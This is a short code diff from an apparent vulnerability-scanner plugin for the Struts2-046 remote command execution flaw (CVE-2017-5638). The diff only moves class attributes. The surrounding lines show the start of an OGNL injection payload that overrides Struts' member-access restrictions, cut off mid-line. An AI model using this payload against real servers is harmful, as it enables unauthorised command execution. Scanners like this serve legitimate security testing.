@@ -7,12 +7,14 @@ import sys
 import requests
 from module.log import logger
 
-description = 'Struts2-046 remote command execute(CVE-2017-5638)'
-querytype = 'site'
-type = 'FRAME'
+
 
 class poc(object):
-   
+
+    type = 'FRAME'
+    querytype = 'site'
+    description = 'Struts2-046 remote command execute(CVE-2017-5638)'
+    
     def __init__(self, v):
         
         self.payload="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):\
